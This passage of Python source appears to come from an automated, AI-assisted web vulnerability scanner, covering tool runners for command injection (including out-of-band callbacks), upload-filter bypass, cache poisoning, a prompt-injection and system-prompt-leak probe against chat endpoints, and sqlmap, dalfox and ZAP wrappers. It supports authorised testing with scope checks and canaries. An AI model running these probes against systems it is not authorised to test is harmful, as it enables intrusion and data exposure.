                                                ri.get("status", 0), ri.get("body", ""))
                if conf:
                    findings.append(ns.auth_bypass_finding(url, field, operator, conf["signal"]))
                    await self._http(url, "POST", headers, inj_body, capture=True)
                    break
            if findings:
                break
        summary = ("auth-bypass NoSQLi CONFIRMED on the login body" if findings
                   else "no body auth-bypass NoSQLi on this endpoint")
        return ToolResult("form_nosqli", url, True, summary, findings)

    async def _run_cmdi(self, inp: dict) -> ToolResult:
        import time
        import httpx
        import collaborator as collab
        import cmdi_tool as cmdi
        from urllib.parse import parse_qsl
        url = inp["url"]
        params = (inp.get("params") or xt.params_of(url))[:self._ni(8, 16, 32)]
        if not params:
            return ToolResult("cmdi", url, True, "No query parameters to test", [])
        seconds = max(3, min(int(inp.get("delay", 5)), 15))
        qvals = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        findings, ev = [], []

        async def get(c, target):
            if not self.scope.validate(target)[0]:
                return None, 0.0
            t0 = time.perf_counter()
            try:
                r = await c.get(target)
                return r, time.perf_counter() - t0
            except Exception:
                return None, time.perf_counter() - t0

        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers,
                                     timeout=seconds + 20) as c:
            base_r, _ = await get(c, url)
            base_body = base_r.text if base_r is not None else ""
            for p in params:
                orig = qvals.get(p, "1")
                confirmed = False
                # 1) computed-output
                for item in cmdi.output_payloads(orig):
                    r, _ = await get(c, xt.set_param(url, p, item["payload"]))
                    if r is None:
                        continue
                    hit = cmdi.analyze_output(base_body, r.text)
                    if hit:
                        _req = xt.set_param(url, p, item["payload"])
                        findings.append(self._attach_poc(cmdi.output_finding(url, p, item["payload"], hit), _req, r))
                        ev.append(_req); confirmed = True
                        break
                if confirmed:
                    continue
                # 2) time-based blind
                for item in cmdi.time_payloads(orig, seconds):
                    _, ctl = await get(c, xt.set_param(url, p, item["control"]))
                    _, slp = await get(c, xt.set_param(url, p, item["payload"]))
                    if cmdi.analyze_time(ctl, slp, seconds):
                        _req = xt.set_param(url, p, item["payload"])
                        findings.append(self._attach_poc(
                            cmdi.time_finding(url, p, item, ctl, slp, seconds), _req, None,
                            timing=f"control={ctl:.1f}s vs injected-sleep({seconds}s)={slp:.1f}s"))
                        ev.append(_req); confirmed = True
                        break
                if confirmed or not collab.enabled():
                    continue
                # 3) OOB (blind, via the native collaborator)
                token = collab.new_token(); collab.register(token)
                purl = collab.probe_url(token)
                for payload in cmdi.oob_payloads(orig, purl):
                    await get(c, xt.set_param(url, p, payload))
                inter = []
                for _ in range(6):
                    inter = collab.hits(token)
                    if inter:
                        break
                    await asyncio.sleep(0.5)
                if inter:
                    findings.append(self._attach_poc(
                        cmdi.oob_finding(url, p, purl, inter), xt.set_param(url, p, payload), None,
                        timing=f"out-of-band callback to {purl} fired from the target ({len(inter)} interaction(s))"))
                collab.clear(token)

        if self.mission_id and ev:
            await self._http(ev[0], "GET", capture=True)
        return ToolResult("cmdi", url, True,
                          f"tested {len(params)} param(s), {len(findings)} confirmed command injection", findings)

    async def _run_form_cmdi(self, inp: dict) -> ToolResult:
        """POST/form-body OS command injection on a captured HTML form — the body-
        parameter class query-string cmdi never reaches (e.g. a DVWA-style exec form
        POSTing `ip`). Baselines the form, injects computed-output + time payloads into
        each field, and reuses the cmdi oracles (an echoed payload cannot false-positive)."""
        import time
        import cmdi_tool as cmdi
        import csrf_tool as csrf
        from urllib.parse import urlencode
        url = inp["url"]
        _SKIP = {"submit", "btn", "button", "send", "login", "user_token", "csrf",
                 "csrf_token", "_token", "authenticity_token"}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        # Forms to test: caller-supplied fields (a pre-captured form) OR self-discover
        # by fetching the page and parsing its forms — so this works whether or not the
        # form was captured earlier.
        forms = []
        if inp.get("fields"):
            forms.append((url, [f for f in inp["fields"] if isinstance(f, str) and f]))
        else:
            r0 = await self._http(url, "GET", capture=False)
            if not r0.get("error"):
                for fm in csrf.parse_forms(r0.get("body", ""), r0.get("final_url") or url):
                    if (fm.get("method") or "").upper() == "POST" or fm.get("inputs"):
                        forms.append((fm.get("action") or url, fm.get("inputs", [])))
        findings = []
        for action, all_fields in forms:
            if not self.scope.validate(action)[0]:
                continue
            fields = [f for f in all_fields if f and f.lower() not in _SKIP]
            if not fields:
                continue

            def body(field, val):
                return urlencode({k: (val if k == field else "1") for k in all_fields})

            rb = await self._http(action, "POST", headers, body(fields[0], "127.0.0.1"), capture=False)
            base_body = rb.get("body", "")
            done = False
            # Output oracle only (fast, no sleeps). This runs across many self-fetched
            # pages, so the 5s time-based oracle would make a remote scan crawl; the
            # computed-output oracle (an echoed payload cannot false-positive) catches
            # the common reflected case. Blind form cmdi stays the query-param tool's job.
            for field in fields[:6]:
                for item in cmdi.output_payloads("127.0.0.1"):
                    r = await self._http(action, "POST", headers, body(field, item["payload"]), capture=False)
                    if r.get("error"):
                        continue
                    hit = cmdi.analyze_output(base_body, r.get("body", ""))
                    if hit:
                        f = cmdi.output_finding(action, field, item["payload"], hit); f["target"] = action
                        await self._http(action, "POST", headers, body(field, item["payload"]), capture=True)
                        findings.append(f); done = True; break
                if done:
                    break
        summary = (f"command injection CONFIRMED in the form body ({findings[0]['target']})" if findings
                   else "no body command injection in the page's forms")
        return ToolResult("form_cmdi", url, True, summary, findings)

    async def _run_upload_test(self, inp: dict) -> ToolResult:
        """File-upload extension-filter bypass test (CWE-434). Non-destructive: every
        payload is a small inert canary, never functional shell code. Sends a
        plainly-blocked control (.exe) first — if it is rejected (proving a filter
        exists), tries a bounded set of disguised-extension bypass filenames
        (double extension, case variation, semicolon) with an image magic-byte
        prefix. CONFIRMED only when the control was rejected AND a bypass variant
        was accepted; if the control itself is accepted, that is a separate
        no-filter-observed lead, never invented as a confirmed bypass."""
        import os as _os
        import upload_tool as up
        url = inp["url"]
        file_field = inp.get("field")
        other_fields = inp.get("other_fields") or []
        action = inp.get("action") or url
        if not file_field:
            r0 = await self._http(url, "GET", capture=False)
            if r0.get("error"):
                return ToolResult("upload_test", url, True, "Could not fetch page for form discovery", [])
            forms = up.find_upload_forms(r0.get("body", ""), r0.get("final_url") or url)
            if not forms:
                return ToolResult("upload_test", url, True, "No file-upload form found", [])
            fm = forms[0]
            action, file_field, other_fields = fm["action"], fm["file_field"], fm["other_fields"]
        if not self.scope.validate(action)[0]:
            return ToolResult("upload_test", url, False, "", [], f"SCOPE BLOCK: {action} not in scope")

        token = _os.urandom(4).hex()
        canary = up.CANARY_BODY_TPL.format(token=token)

        # 1) control: a plainly-blocked extension, benign content
        ch, cb = up.multipart_body(file_field, f"apolaki_control_{token}.{up.BLOCKED_CONTROL_EXT}",
                                   canary, other_fields, content_type="application/octet-stream")
        cr = await self._http(action, "POST", ch, cb, capture=False)
        control_verdict = up.verdict(0, "", cr.get("status", 0), cr.get("body", ""))

        findings = []
        if control_verdict == "accepted":
            # nothing to bypass — no filter was observed at all
            findings.append(up.no_restriction_lead(file_field))
        else:
            for filename, ext in up.bypass_filenames("apolaki_" + token):
                bh, bb = up.multipart_body(file_field, filename, "GIF89a " + canary, other_fields,
                                           content_type="image/gif")
                br = await self._http(action, "POST", bh, bb, capture=False)
                v = up.verdict(cr.get("status", 0), cr.get("body", ""), br.get("status", 0), br.get("body", ""))
                if v == "accepted":
                    upload_url = up.extract_url(br.get("body", ""))
                    findings.append(up.bypass_finding(file_field, filename, ext, upload_url))
                    await self._http(action, "POST", bh, bb, capture=True)
                    break
        summary = (f"upload filter BYPASSED ({findings[0]['title'][:50]})" if findings and findings[0]["severity"] == "critical"
                   else ("no restriction observed on upload endpoint" if findings else "upload filter held; no bypass"))
        return ToolResult("upload_test", action, True, summary, findings)

    async def _run_cache_poison(self, inp: dict) -> ToolResult:
        """Web cache-poisoning / unkeyed-header test (CWE-444-adjacent). Owns its own
        cache entry via a per-run cache-buster query param — never touches a real
        visitor's cached response. Single-shot: stops at the first CONFIRMED header
        and never repeats poisoning against the same endpoint. CONFIRMED only when a
        SUBSEQUENT unpoisoned request to the same cache-buster URL still receives the
        injected canary — proof the cache actually stored and served it."""
        import os as _os
        import cache_tool as ct
        url = inp["url"].rstrip("/") or inp["url"]
        sep = "&" if "?" in url else "?"
        cb = _os.urandom(4).hex()
        target = f"{url}{sep}bbh_cb={cb}"
        headers_to_try = [h for h in ct.POISON_HEADERS if h.lower() not in
                          {k.lower() for k in (self.session_headers or {})}][:len(ct.POISON_HEADERS)]
        findings = []
        for header in headers_to_try:
            canary = ct.canary_value(_os.urandom(3).hex())
            poisoned = await self._http(target, "GET", {header: canary}, capture=False)
            if poisoned.get("error"):
                continue
            if not ct.reflects(canary, poisoned.get("body", ""), poisoned.get("headers", {})):
                continue
            if not ct.is_cacheable(poisoned.get("headers", {})):
                findings.append(ct.unkeyed_header_lead(target, header, canary))
                break
            # confirmatory re-request: SAME cache-buster URL, NO poison header
            clean = await self._http(target, "GET", {}, capture=False)
            if not clean.get("error") and ct.reflects(canary, clean.get("body", ""), clean.get("headers", {})):
                findings.append(ct.poison_confirmed_finding(target, header, canary))
                await self._http(target, "GET", {header: canary}, capture=True)
                break
            findings.append(ct.unkeyed_header_lead(target, header, canary))
            break
        summary = (f"cache poisoning CONFIRMED via {findings[0]['tags'][1]}" if findings and findings[0]["confidence"] == "confirmed"
                   else ("unkeyed header reflected (unconfirmed persistence)" if findings else "no unkeyed-header reflection observed"))
        return ToolResult("cache_poison", target, True, summary, findings)

    async def _run_llm_probe(self, inp: dict) -> ToolResult:
        """LLM/chatbot prompt-injection probe (CWE-1427 / OWASP LLM01). Only fires
        against a URL that already looks like a chat/AI endpoint — never spams every
        endpoint. Sends a benign instruction-override probe asking the model to
        emit a unique marker; CONFIRMED only on exact marker compliance (a marker
        has zero legitimate reason to appear in any real response). A separate
        system-prompt-leak probe is heuristic-only and always stays a lead."""
        import json as _json
        import os as _os
        import llm_tool as lt
        url = inp["url"]
        if not lt.looks_like_chat_endpoint(url):
            return ToolResult("llm_probe", url, True, "URL does not look like a chat/AI endpoint — skipped", [])
        token = _os.urandom(4).hex()
        headers = {"Content-Type": "application/json"}
        field_candidates = inp.get("field_candidates") or ["message", "prompt", "query", "text", "input"]
        findings = []
        canary_text = lt.canary_probe(token)
        for field in field_candidates:
            body = _json.dumps({field: canary_text})
            r = await self._http(url, "POST", headers, body, capture=False)
            if r.get("error"):
                continue
            if lt.canary_confirmed(r.get("body", ""), token):
                findings.append(lt.injection_confirmed_finding(url, token, r.get("body", "")))
                await self._http(url, "POST", headers, body, capture=True)
                break
        if not findings and field_candidates:
            body = _json.dumps({field_candidates[0]: lt.system_prompt_probe()})
            r = await self._http(url, "POST", headers, body, capture=False)
            if not r.get("error") and lt.looks_like_system_leak(r.get("body", "")):
                findings.append(lt.system_leak_lead(url, r.get("body", "")))
        summary = ("prompt injection CONFIRMED (instruction override)" if findings and findings[0]["confidence"] == "confirmed"
                   else ("possible system-prompt disclosure (lead)" if findings else "no prompt-injection signal observed"))
        return ToolResult("llm_probe", url, True, summary, findings)

    async def _run_zap(self, inp: dict) -> ToolResult:
        import zap_client as zc
        url = inp["url"]
        if not zc.configured():
            return ToolResult("zap", url, True,
                              "ZAP not configured — enable with: docker compose --profile zap up -d "
                              "and set ZAP_ADDR=http://zap:8090", [])
        # 120s per-call timeout: under a heavy thorough/demon scan the ZAP API (esp.
        # /alerts and status polls) is slow; the 30s default read-timed-out and, since
        # httpx ReadTimeout stringifies to '', surfaced as a blank "ZAP scan error:".
        zap = zc.ZapClient(timeout=120)
        try:
            await zap.version()
        except Exception as e:
            return ToolResult("zap", url, False, "", [], f"ZAP daemon unreachable at ZAP_ADDR: {e}")

        # DEF-2 guard: clear any orphaned scans from an earlier/killed mission so this
        # run starts against a fresh, responsive daemon (a still-running prior scan
        # otherwise overloads the shared ZAP and its API read-times-out).
        await zap.stop_all()
        name = f"bbh-{self.mission_id or 'x'}-{os.urandom(2).hex()}"
        try:
            ctx_id = await zap.new_context(name)
            for rx in zc.include_regexes(self.scope):
                await zap.include_in_context(name, rx)
            # seed the context: start URL + discovered in-scope URLs on the same host
            await zap.access_url(url)
            base = urlparse(url)
            for s in [u for u in self.urls if urlparse(u).netloc == base.netloc][:40]:
                try:
                    await zap.access_url(s)
                except Exception:
                    pass
            # policy: passive (spider + passive scan, NO active scan) | safe_active
            # (rate-limited active scan) | thorough_active (deeper active scan).
            policy = (inp.get("policy") or getattr(self, "zap_policy", "safe_active"))
            if policy not in ("passive", "safe_active", "thorough_active"):
                policy = "safe_active"
            ascan_err = ""      # set if the active scan degrades but passive alerts survive
            # spider -> ajax spider (SPA) — always run (feeds the passive scanner too)
            sid = await zap.spider(url, context=name)
            if sid is not None:
                await zap.wait_int(lambda: zap.spider_status(sid),
                                   cap=int(inp.get("spider_seconds", 180)), stop_event=self.stop_event)
            try:
                await zap.ajax_start(url, context=name)
                await zap.wait_str(lambda: zap.ajax_status(), cap=120, stop_event=self.stop_event)
            except Exception:
                pass
            if policy == "passive":
                # passive scanning runs automatically as ZAP processes the crawled
                # traffic; drain its queue (remaining==0 -> "100% done"), then
                # collect alerts. No active scan.
                async def _pscan_done():
                    return 100 if (await zap.pscan_remaining()) == 0 else 0
                await zap.wait_int(_pscan_done, cap=90, stop_event=self.stop_event)
            else:
                # active scan — two INDEPENDENT dials:
                #  SPEED = request pacing (delay + threads + parallel hosts): turtle
                #    is slow/polite for fragile/production targets; fast maximises
                #    throughput. This is about network manners, not attack depth.
                #  AGGRESSION = ZAP attack strength per parameter: low is gentle,
                #    demon throws every payload (HIGH strength) and flags anything
                #    (LOW alert threshold). This is about how HARD it attacks, not
                #    how fast. e.g. turtle+demon = slow on the wire, brutal per param.
                speed = (inp.get("speed") or getattr(self, "zap_speed", "normal"))
                aggr = (inp.get("aggression") or getattr(self, "zap_aggression", "normal"))
                _SPEED = {"turtle": (1200, 1, 1, 900), "normal": (200, 2, 2, None),
                          "fast": (0, 6, 6, 900)}
                _AGGR = {"low": ("LOW", "HIGH"), "normal": ("MEDIUM", None),
                         "demon": ("HIGH", "LOW")}
                delay_ms, threads, hosts, cap_override = _SPEED.get(speed, _SPEED["normal"])
                strength, threshold = _AGGR.get(aggr, _AGGR["normal"])
                setups = [zap.add_scan_header(), zap.set_injectable(),
                          zap.set_scan_rate(delay_ms=delay_ms, threads_per_host=threads),
                          zap.set_hosts_per_scan(hosts),
                          zap.set_attack_strength(strength, threshold)]
                oast = inp.get("oast_service") or os.getenv("ZAP_OAST_SERVICE", "")
                if oast:
                    setups.append(zap.set_oast_service(oast))
                for setup in setups:
                    try:
                        await setup
                    except Exception:
                        pass
                # Active scan in its OWN try: if it errors or times out (common with
                # thorough_active on a slow live target), keep the passive alerts already
                # gathered rather than discarding the whole ZAP result.
                try:
                    asid = await zap.ascan(url, context_id=ctx_id, policy=inp.get("scan_policy") or None)
                    if asid is not None:
                        cap = int(inp.get("scan_seconds", cap_override or (300 if policy == "safe_active" else 600)))
                        await zap.wait_int(lambda: zap.ascan_status(asid), cap=cap, stop_event=self.stop_event)
                except Exception as _ae:
                    ascan_err = f"{type(_ae).__name__}: {_ae}".strip(": ")
            raw = zc.dedup_alerts(await zap.alerts(baseurl=f"{base.scheme}://{base.netloc}"))
        except Exception as e:
            return ToolResult("zap", url, False, "", [], f"ZAP scan error: {type(e).__name__}: {e}".strip(": "))

        findings = [zc.alert_to_finding(a) for a in raw]
        findings = [f for f in findings if f["severity"] in ("critical", "high", "medium", "low")]
        self.recon.setdefault("zap", []).extend(findings)
        # the note starts with a policy token so the report/ledger can render the
        # exact state ("ZAP Executed — Passive Only / Safe Active / Thorough Active");
        # speed is included for the methodology (turtle / normal / demon pacing).
        _plabel = {"passive": "passive", "safe_active": "safe-active",
                   "thorough_active": "thorough-active"}[policy]
        if policy == "passive":
            _dials = "speed=n/a; aggression=n/a"
        else:
            _dials = (f"speed={inp.get('speed') or getattr(self, 'zap_speed', 'normal')}; "
                      f"aggression={inp.get('aggression') or getattr(self, 'zap_aggression', 'normal')}")
        _degraded = f" [active scan degraded, passive alerts kept: {ascan_err}]" if ascan_err else ""
        return ToolResult("zap", url, True,
                          f"policy={policy}; {_dials}; {len(findings)} ZAP alert(s) "
                          f"[{_plabel}] (from {len(raw)} raw){_degraded}", findings)

    async def _run_dalfox(self, inp: dict) -> ToolResult:
        url = inp["url"]
        intensity = getattr(self, "intensity", "standard")
        cmd = ["dalfox", "url", url, "--silence", "--format", "json"]
        # deep/insane: hunt DOM XSS harder (deep DOM sink walk + DOM param mining).
        if intensity in ("deep", "insane"):
            cmd += ["--deep-domxss", "--mining-dom"]
        # Blind XSS: when the operator published a native collaborator (BBH_OOB_BASE),
        # feed dalfox a blind callback so a stored/blind XSS that fires later still
        # proves itself out-of-band. No base configured -> no blind (never a dead flag).
        import collaborator as _collab
        if intensity in ("deep", "insane") and _collab.enabled():
            cmd += ["-b", _collab.base()]
        # Authenticated scanning: carry the session so dalfox reaches the post-login DOM.
        for _k, _v in (self.session_headers or {}).items():
            if str(_v).strip():
                cmd += ["-H", f"{_k}: {_v}"]
        timeout = {"standard": 240, "deep": 480, "insane": 720}.get(intensity, 240)
        out, err = await self._cmd(cmd, timeout=timeout)
        if err.startswith("__MISSING__"):
            return ToolResult("dalfox", url, False, "", [], "dalfox not installed")
        findings = []
        for line in out.strip().split("\n"):
            try:
                findings.append(json.loads(line))
            except Exception:
                pass
        return ToolResult("dalfox", url, True, f"{len(findings)} XSS signals", findings)

    async def _run_sqlmap(self, inp: dict) -> ToolResult:
        url = inp["url"]
        data = inp.get("data", "")
        intensity = (inp.get("intensity") or getattr(self, "intensity", "standard")).lower()
        # Intensity scales sqlmap from a shallow poke to a full injection audit.
        # standard L1R1 (fast); deep L3R2 + all techniques; insane L5R3 + all
        # techniques + read-only proof enumeration (names the DBs/user the injection
        # exposes — no writes, no data dumps). Timeout grows so heavy runs finish.
        # sqlmap here is CORROBORATION — the native _sqli_db_metadata extractor already
        # confirms the injection and pulls DBMS/user/db in seconds, so a 30-min-per-call
        # insane budget only stalls the run (9 endpoints x 30min = a multi-hour tail that
        # never reaches "complete"). Bound insane to 10 min/call: sqlmap still finds a real
        # injection well inside that, and the run stays completable.
        level, risk, timeout = {
            "standard": (1, 1, 420), "deep": (3, 2, 420), "insane": (5, 3, 600),
        }.get(intensity, (1, 1, 420))
        cmd = ["sqlmap", "-u", url, "--batch", "--level", str(level), "--risk", str(risk),
               "--flush-session", "--random-agent"]
        # Authenticated scanning: carry the mission's session so sqlmap reaches the
        # post-login surface (otherwise DVWA-style auth'd SQLi can never be confirmed).
        _hdrs = self.session_headers or {}
        _cookie = _hdrs.get("Cookie") or _hdrs.get("cookie")
        if _cookie:
            cmd += ["--cookie", _cookie]
        for _hk, _hv in _hdrs.items():
            if _hk.lower() == "cookie" or not str(_hv).strip():
                continue
            cmd += ["-H", f"{_hk}: {_hv}"]               # e.g. Authorization: Bearer ...
        if intensity in ("deep", "insane"):
            cmd += ["--technique", "BEUSTQ"]              # boolean/error/union/stacked/time/inline
        if intensity == "insane":
            # read-only proof: what the injection actually exposes. No --dump (no data theft).
            cmd += ["--threads", "4", "--current-user", "--current-db", "--is-dba", "--dbs"]
        if data:
            cmd += ["--data", data]
        settings = " ".join(cmd[3:])                       # everything after `sqlmap -u <url>`
        out, err = await self._cmd(cmd, timeout=timeout)
        if err.startswith("__MISSING__"):
            return ToolResult("sqlmap", url, False, "", [], "sqlmap not installed")
        vuln = "is vulnerable" in out or "sqlmap identified" in out
        if not vuln:
            # No confirmation → NOT a finding (truth-first). Severity-less data item so
            # _auto_store drops it; the log tail stays for the operator/model to inspect.
            return ToolResult("sqlmap", url, True, f"No SQLi confirmed [{intensity}]",
                              [{"vulnerable": False, "log_tail": out[-800:], "settings": settings}])
        # Confirmed → shape a proper finding with PARSED proof so it survives auto-store
        # (previously the severity-less {vulnerable,log_tail} shape was silently dropped
        # in deterministic/floor mode — sqlmap could confirm and the finding never landed).
        proof = _parse_sqlmap_proof(out)
        param = proof.get("parameter") or "a parameter"
        finding = {
            "severity": "high", "cwe": "CWE-89", "target": url,
            "title": f"SQL injection in {param}",
            "confidence": "confirmed", "tool": "sqlmap", "settings": f"sqlmap {settings}",
            "evidence": proof["evidence_text"],
            "request": (f"{url}" + (f"  --data {data}" if data else "")),
            "reproduction_steps": [
                f"Run: sqlmap -u '{url}'" + (f" --data '{data}'" if data else "")
                + f" --batch --level {level} --risk {risk}"
                + (" --technique BEUSTQ" if intensity != "standard" else ""),
                "sqlmap re-confirms the injection point and back-end DBMS shown in the evidence.",
            ],
            "false_positive_check": ("sqlmap validates each payload against a baseline before reporting; "
                                     "the named technique + DBMS fingerprint is the proof, not a single reflected string."),
            "impact": ("An attacker can read (and potentially modify) database contents through this parameter, "
                       "exposing credentials, tokens, and other users' data."),
            "log_tail": out[-1200:],
        }
        return ToolResult("sqlmap", url, True, f"SQLi CONFIRMED in {param} [{intensity}]", [finding])

    # ── PASSIVE advisory: playbook + storage ─────────────────────
    async def _generate_playbook(self, inp: dict) -> ToolResult:
        recon = dict(self.recon)
        recon["urls"] = self.urls
        # consolidate: a wide surface emits the same class once per host; group into
        # the top actionable, prioritized leads so the operator isn't buried.
        guide = guidance_mod.consolidate(guidance_mod.build_guidance(recon))
        stats = guidance_mod.guidance_stats(guide)
        # persist the playbook so the UI Playbooks tab can render it
        if self.mission_id:
            m = db.get_mission(self.mission_id)
            ctx = (m or {}).get("context", {})
            ctx["playbook"] = guide
            ctx["playbook_stats"] = stats
            db.update_mission(self.mission_id, context=ctx)
        slim = [{"title": g["title"], "severity": g["severity"], "confidence": g["confidence"],
                 "surface": g["surface"], "what": g["what_to_test"]} for g in guide[:25]]
        return ToolResult("generate_playbook", self.recon.get("target", ""), True,
                          f"{stats['total']} test playbooks generated", slim)

    # Access-control / business-logic classes cannot be visually confirmed — a model may
    # only mark them CONFIRMED with request/response evidence. Without it, demote to a lead.
    _ORACLE_FAMILIES = ("idor", "bola", "bfla", "authz", "access-control", "access_control",
                        "business_logic", "broken_access")

    async def _store_finding(self, inp: dict) -> ToolResult:
        fam = (inp.get("family") or "").lower()
        conf = (inp.get("confidence") or "").lower()
        if fam in self._ORACLE_FAMILIES and conf in ("confirmed", "", "high"):
            has_evidence = bool(str(inp.get("evidence") or "").strip()) and bool(inp.get("reproduction_steps"))
            if not has_evidence:
                inp["confidence"] = "lead"
                inp["analyst_notes"] = ((inp.get("analyst_notes") or "") +
                                        " [demoted to lead: access-control/business-logic findings require captured "
                                        "request/response evidence — confirm with confirm_idor or an http_diff oracle]").strip()
        if self.mission_id:
            # Dedup against what auto-store already recorded (shared fingerprint set from
            # the agent). A proof-based finding auto-store already landed must not be
            # written again by the model's store_finding — keeps AI additive, not doubling.
            fps = getattr(self, "_stored_fps", None)
            if fps is not None:
                import memory as _mem
                if _mem.finding_fp(inp) in fps:
                    return ToolResult("store_finding", inp.get("target", ""), True,
                                      "Finding already recorded (deduped)", [inp])
            fid = db.add_finding(self.mission_id, dict(inp))
            inp["id"] = fid
            # attach any evidence captured for this target
            evid = [e for e in db.get_exchanges(self.mission_id)
                    if e.get("url") and e["url"].startswith(inp.get("target", "\0"))]
            for e in evid[:3]:
                db.add_exchange(self.mission_id, e, finding_id=fid)
        return ToolResult("store_finding", inp.get("target", ""), True, "Finding stored", [inp])

    # ── surface snapshot (for the UI Surface tab) ────────────────
    def surface_inventory(self) -> dict:
        inv = surface_mod.build_inventory(self.urls)
        return {"inventory": inv, "stats": surface_mod.surface_stats(inv)}
